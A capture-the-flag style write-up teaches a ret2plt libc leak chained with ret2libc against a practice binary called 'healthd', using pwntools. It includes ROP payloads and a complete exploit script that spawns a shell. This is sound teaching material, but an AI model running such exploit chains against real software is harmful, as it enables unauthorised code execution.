---
title: "Ret2PLT technique demonstration"
---

## Overview
This was a challenge that AI created for me. The goal is to exploit a buffer overflow and achieve code execution by utilizing ret2plt.

There are two ways I know of to utilize **ret2plt**. One way is meant for leaking the libc base address, and the second option is calling a function through the PLT directly with no leak required. For this post I'll be using it for a leak and combining it with **ret2libc**.
**Ret2plt** is a method of bypassing ASLR that is common to find, because it relies on function address resolution within GOT and PLT which happens everywhere.

#### Mitigations
```
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
Debuginfo:  Yes
```
- **ASLR** is enabled on the system.

---
## Vulnerability
The program prompts for a probe note. If you look at the code attached below, it allows us to provide `0x100` bytes of input, but the buffer it stores our input in is only `0x40` bytes.
This is a generic buffer overflow scenario. 

![vulnerable code photo](/assets/images/ret2plt-demonstration/vuln.png)

---
## Stage 1 - Ret2PLT to leak libc
Ret2PLT works because you are creating a ROP chain to call `puts@plt` (or `printf` / `write`) and passing a GOT entry as its argument. This will result in the program outputting a resolved libc address of a function, allowing you to calculate the libc base address using basic subtraction.

1. Find a gadget to control the first argument passed into a function

    ![ropgadget output photo](/assets/images/ret2plt-demonstration/gadget.png)

2. Create a ROP chain that calls a resolved function in the binary equivalent to `puts`

    ```python
    payload = flat(
        b"A" * 72,
        ret,                      # added for alignment
        pop_rdi,
        elf.got["puts"],          # ready to call puts()
        elf.plt["puts"],          # calling puts to print the puts address
        ret,                      # added for alignment
        elf.sym["main"],
    )

    p.sendlineafter(b"target host>", b"A")
    p.sendlineafter(b"probe note>", payload)
    ```

    - Notice I return to `main`. This is because we run the program twice in total. The first one to leak libc, and the second time to use the leak for code execution.
    - When I was solving this, I first tried `printf` because the program never called `puts`. After doing research I realized that the compiler replaces `printf` with `puts` for optimization if there is no format specifier. I figured this out because I was getting back GOT/PLT looking memory addresses.

3. This will now output the address of `puts`, so the next thing to do is write a parser and do libc base calculations to use the leak

    ```bash
    b' \xc0|\x08\xb2!|\n[healthd] node online, probes ready\ntarget host> '
    ```

    ```python
    leak = p.recvline(timeout=5).split(b"[")[0][1:]
    leak = leak[:6].ljust(8, b"\x00")
    leak = u64(leak)

    libc.address = leak - libc.sym["puts"]

    print(f"leak: {hex(leak)}")
    print(f"libc base: {libc.address:#x}")
    ```

---
## Stage 2 - ret2libc for Code Execution
We gave `pwntools` the address of libc, so now we can just load symbols from libc and create a ROP chain.

Remember in Stage 1 how we looped back to call main? That is for this reason. First run was to execute the payload to trigger a leak using **ret2plt**, now the second stage is using the leak to call `system` for an interactive shell.

```python
payload = flat(
    b"A" * 72,
    pop_rdi, next(libc.search(b"/bin/sh")),
    ret,
    libc.sym["system"],
)

p.sendlineafter(b"target host>", b"A")
p.sendlineafter(b"probe note>", payload)

p.interactive()
```

---
## Final Exploit
```python
from pwn import *

context.terminal = ["zellij", "action", "new-tab", "--"]
context.arch = "amd64"

if args.GDB:
    GDBSCRIPT="set follow-fork-mode parent\nb *main\ncontinue"
    p = gdb.debug("./healthd", gdbscript=GDBSCRIPT)
else:
    p = process("./healthd")


libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
elf = ELF("./healthd", checksec=False)
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

# stage 1 - leak libc with ret2plt and return back to main()
payload = flat(
    b"A" * 72,
    ret,
    pop_rdi, elf.got["puts"], # ready to call puts()
    elf.plt["puts"],          # calling puts to print the printf address
    ret,
    elf.sym["main"],
)

p.sendlineafter(b"target host>", b"A")
p.sendlineafter(b"probe note>", payload)

print(p.recvall(timeout=3))

# parse the leak
leak = p.recvline(timeout=5).split(b"[")[0][1:]
leak = leak[:6].ljust(8, b"\x00")
leak = u64(leak)

libc.address = leak - libc.sym["puts"]

print(f"leak: {hex(leak)}")
print(f"libc base: {libc.address:#x}")

# stage 2 - ret2libc
print("STAGE 2")
payload = flat(
    b"A" * 72,
    pop_rdi, next(libc.search(b"/bin/sh")),
    ret,
    libc.sym["system"],
)

p.sendlineafter(b"target host>", b"A")
p.sendlineafter(b"probe note>", payload)

p.interactive()
```